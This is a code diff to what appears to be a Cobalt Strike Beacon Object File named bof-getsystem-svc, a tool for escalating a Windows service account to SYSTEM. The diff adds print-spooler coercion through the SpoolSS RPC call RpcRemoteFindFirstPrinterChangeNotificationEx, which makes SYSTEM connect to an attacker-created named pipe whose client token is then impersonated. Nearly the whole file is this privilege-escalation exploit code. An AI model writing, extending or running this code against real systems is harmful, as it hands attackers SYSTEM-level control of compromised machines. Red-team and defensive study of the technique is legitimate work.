@@ -1,26 +1,28 @@
 /*
- * bof-getsystem-svc [pipename] [timeout-seconds]
+ * bof-getsystem-svc [pipename] [timeout-seconds] [spoolss|none]
  *
  * Named-pipe impersonation primitive for the local-service -> SYSTEM step.
- * Creates a named pipe, waits for a privileged client to connect, calls
- * ImpersonateNamedPipeClient and reports the resulting token.
+ * Creates a named pipe, optionally coerces the print spooler to connect to it
+ * (SpoolSS RpcRemoteFindFirstPrinterChangeNotificationEx), waits for the
+ * privileged client, calls ImpersonateNamedPipeClient and reports the token.
  *
- * This BOF only provides the server half: you must trigger a SYSTEM service
- * to connect to the pipe (for example an RPC coercion or a service that
- * opens a client pipe).  Defaults: pipe `bof_getsystem`, 30 second wait.
- * The impersonation is reverted before returning, so use it to verify access
- * or combine it with another primitive.
+ * Defaults: pipe `bof_getsystem`, 30 second wait, no coercion.  Pass `spoolss`
+ * as the third argument to have this BOF trigger the SYSTEM connection itself
+ * (the spooler must be running and the caller needs SeImpersonatePrivilege).
+ * The impersonation is reverted before returning.
  */
 #include "beacon.h"
 #include "bofdefs.h"
 #include "helpers.h"
 #include "tokenhelpers.h"
+#include "spoolss.h"
 
 void go(char *args, int alen)
 {
     datap parser;
     char *pipearg = "bof_getsystem";
-    int plen = 0, timeout = 30;
+    char *coerce = "";
+    int plen = 0, clen = 0, timeout = 30;
     char path[MAX_PATH], line[512];
     HANDLE pipe, ev;
     OVERLAPPED ov;
@@ -34,6 +36,8 @@ void go(char *args, int alen)
         int t = BeaconDataInt(&parser);
         if (t > 0 && t <= 600) timeout = t;
     }
+    coerce = BeaconDataExtract(&parser, &clen);
+    if (!coerce) coerce = "";
 
     bof_strncpy(path, "\\\\.\\pipe\\", sizeof(path));
     bof_strncat(path, pipearg, sizeof(path) - bof_strlen(path) - 1);
@@ -63,6 +67,12 @@ void go(char *args, int alen)
     ov.hEvent = ev;
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] listening on %s (%d s)\n", path, timeout);
+    if (bof_stricmp(coerce, "spoolss") == 0 || bof_stricmp(coerce, "auto") == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] coercing spooler via SpoolSS\n");
+        if (bof_spoolss_coerce(pipearg) != 0)
+            BeaconPrintf(CALLBACK_OUTPUT,
+                         "[!] coercion returned an error; still waiting\n");
+    }
 
     ok = KERNEL32$ConnectNamedPipe(pipe, &ov);
     err = KERNEL32$GetLastError();
